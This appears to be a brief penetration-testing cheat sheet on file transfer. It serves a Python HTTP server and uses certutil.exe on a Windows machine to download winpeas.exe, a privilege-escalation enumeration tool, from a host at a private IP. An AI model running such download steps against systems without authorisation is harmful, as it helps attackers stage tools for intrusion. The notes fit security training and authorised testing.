## Python Servers
```bash
python3 -m http.server 80
```
### Downloading files onto Windows machine
```cmd
certutil.exe -urlcache -f http://192.168.70.128/winpeas.exe winpeas.exe
/// last winpeas.exe is the name of the file on the local disk it is downloading it to
```
##### Note: put stuff to upload in a specific folder(e.g. transfer) and open the server from that folder